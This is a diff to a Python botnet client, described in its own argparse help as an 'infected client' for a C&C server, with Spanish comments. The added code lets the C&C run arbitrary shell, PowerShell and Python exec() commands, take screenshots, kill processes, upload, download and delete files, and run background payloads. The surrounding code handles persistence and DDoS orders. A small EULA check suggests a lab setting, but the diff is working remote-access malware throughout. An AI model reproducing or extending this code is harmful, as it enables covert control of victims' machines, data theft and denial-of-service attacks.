@@ -13,7 +13,32 @@ import configparser
 import traceback
 import time
 import hashlib
+import json
 
+# Importar los módulos con las funcionalidades
+from modules.basic_commands import (
+    execute_system_command,
+    get_system_info,
+    capture_screenshot,
+    list_processes,
+    kill_process,
+    list_network_connections
+)
+from modules.file_operations import (
+    list_directory,
+    upload_file,
+    download_file,
+    delete_file,
+    create_directory
+)
+from modules.advanced_execution import (
+    execute_powershell,
+    execute_background_payload
+)
+
+
+# Variables globales
+ddos_running = False
 BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 parser = argparse.ArgumentParser(description="Cliente infectado para conectar al C&C.")
 parser.add_argument("--host", required=True, help="IP del servidor C&C")
@@ -249,8 +274,8 @@ def detectar_sistema():
 def conectar_a_CnC():
     try:
         bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        bot.connect((HOST, PORT))
-        logging.info(f"Conectado al servidor C&C {HOST}:{PORT}")
+        bot.connect((args.host, args.port))
+        logging.info(f"Conectado al servidor C&C {args.host}:{args.port}")
         return bot
     except Exception as e:
         logging.error(f"Error al conectar con el C&C: {traceback.format_exc()}")
@@ -332,9 +357,26 @@ def intentar_persistencia():
 
     return mensaje_final
 
+def enviar_respuesta_completa(bot, respuesta):
+    """
+    Envía una respuesta completa al servidor, manejando respuestas grandes.
+
+    :param bot: El socket del bot conectado.
+    :type bot: socket.socket
+    :param respuesta: La respuesta a enviar.
+    :type respuesta: bytes
+    """
+    try:
+        # Dividir la respuesta en partes si es muy grande
+        for i in range(0, len(respuesta), 4096):
+            bot.send(respuesta[i:i+4096])
+        # Enviar una señal de fin de respuesta
+        bot.send(b"<END_OF_RESPONSE>")
+    except Exception as e:
+        logging.error(f"Error al enviar la respuesta completa: {e}")
+
 def esperar_ordenes(bot):
-    global ddos_running
-    ddos_running = False
+    """Procesa las órdenes recibidas del servidor."""
     while True:
         try:
             orden = bot.recv(1024).decode('utf-8', errors='ignore').strip()
@@ -342,28 +384,80 @@ def esperar_ordenes(bot):
                 continue
             
             logging.info(f"Comando recibido: {orden}")
+            resultado = None
 
-            if orden == "detect_os":
-                bot.send(detectar_sistema().encode("utf-8"))
-                continue
-            elif orden == "persistencia":
-                resultado = intentar_persistencia().encode("utf-8")
-            elif "hping3" in orden or "Test-NetConnection" in orden:
-                ddos_running = True
-                resultado = simular_ddos(orden).encode("utf-8")
-            elif orden == "stop_ddos":
-                ddos_running = False
-                resultado = "[INFO] DDoS detenido".encode("utf-8")
-            else:
-                so = detectar_sistema()
-                if so == "windows":
-                    resultado = ejecutar_comando(orden)
-                elif so == "linux":
-                    resultado = ejecutar_comando(orden)
+            # Procesamiento de comandos
+            try:
+                if orden == "shutdown":
+                    logging.info("Recibida orden de apagado")
+                    bot.close()
+                    break
+
+                elif orden == "detect_os":
+                    bot.send(detectar_sistema().encode("utf-8"))
+                    continue
+
+                elif orden == "sysinfo":
+                    resultado = get_system_info()
+
+                elif orden == "screenshot":
+                    resultado = capture_screenshot()
+                    if resultado['success']:
+                        resultado = f"data:image/png;base64,{resultado['image']}"
+                    else:
+                        resultado = f"Error: {resultado['error']}"
+
+                elif orden.startswith("cmd:"):
+                    comando = orden[4:]
+                    resultado = execute_system_command(comando)
+
+                elif orden.startswith("file:"):
+                    partes = orden[5:].split(":", 2)
+                    if len(partes) >= 2:
+                        operacion, ruta = partes[0], partes[1]
+                        file_data = partes[2] if len(partes) > 2 else None
+                        resultado = procesar_operacion_archivo(operacion, ruta, file_data)
+                    else:
+                        resultado = {"success": False, "error": "Comando de archivo inválido"}
+
+                elif orden.startswith("script:"):
+                    partes = orden[7:].split(":", 1)
+                    if len(partes) == 2:
+                        tipo, contenido = partes
+                        resultado = ejecutar_script(tipo, contenido)
+                    else:
+                        resultado = {"success": False, "error": "Formato de script inválido"}
+
+                elif orden == "procesos":
+                    resultado = list_processes()
+
+                elif orden.startswith("kill:"):
+                    pid = int(orden[5:])
+                    resultado = kill_process(pid)
+
+                elif orden == "netstat":
+                    resultado = list_network_connections()
+
+                elif orden == "persistencia":
+                    resultado = intentar_persistencia()
+
                 else:
-                    resultado = f"[ERROR] Sistema operativo no reconocido: {so}".encode("utf-8")
+                    resultado = {"success": False, "error": f"Comando no reconocido: {orden}"}
 
-            bot.send(resultado if resultado else b"Comando ejecutado sin salida")
+                # Procesar y enviar la respuesta
+                if isinstance(resultado, dict):
+                    resultado = json.dumps(resultado).encode('utf-8')
+                elif isinstance(resultado, str):
+                    resultado = resultado.encode('utf-8')
+                elif not isinstance(resultado, bytes):
+                    resultado = str(resultado).encode('utf-8')
+
+                enviar_respuesta_completa(bot, resultado)
+
+            except Exception as e:
+                error_msg = f"Error ejecutando {orden}: {str(e)}"
+                logging.error(error_msg)
+                enviar_respuesta_completa(bot, error_msg.encode('utf-8'))
 
         except ConnectionResetError:
             logging.info("El servidor ha cerrado la conexión.")
@@ -371,6 +465,36 @@ def esperar_ordenes(bot):
         except Exception as e:
             logging.error(f"Error en la comunicación con el servidor: {traceback.format_exc()}")
             break
+
+    logging.info("Cliente cerrado correctamente")
+    sys.exit(0)
+
+def procesar_operacion_archivo(operacion, ruta, file_data=None):
+    """Procesa operaciones con archivos."""
+    operaciones = {
+        "list": lambda: list_directory(ruta),
+        "download": lambda: download_file(ruta),
+        "upload": lambda: upload_file(ruta, file_data) if file_data else {"success": False, "error": "No se proporcionaron datos"},
+        "delete": lambda: delete_file(ruta),
+        "mkdir": lambda: create_directory(ruta)
+    }
+    
+    if operacion in operaciones:
+        return operaciones[operacion]()
+    return {"success": False, "error": f"Operación no válida: {operacion}"}
+
+def ejecutar_script(tipo, contenido):
+    """Ejecuta diferentes tipos de scripts."""
+    tipos_script = {
+        "powershell": execute_powershell,
+        "cmd": lambda x: execute_system_command(x, shell=True),
+        "python": lambda x: exec(x),
+        "background": lambda x: execute_background_payload(x)
+    }
+    
+    if tipo in tipos_script:
+        return tipos_script[tipo](contenido)
+    return {"success": False, "error": f"Tipo de script no soportado: {tipo}"}
 
 def ejecutar_comando(orden):
     """
@@ -474,7 +598,7 @@ if __name__ == "__main__":
             
         verificar_eula("cliente")
         HOST = args.host
-        PORT = args.port
+        PORT = args.port  # Usar el puerto CnC (5001)
 
         logging.info(f"Conectando a {HOST}:{PORT} con autenticación segura...")
 
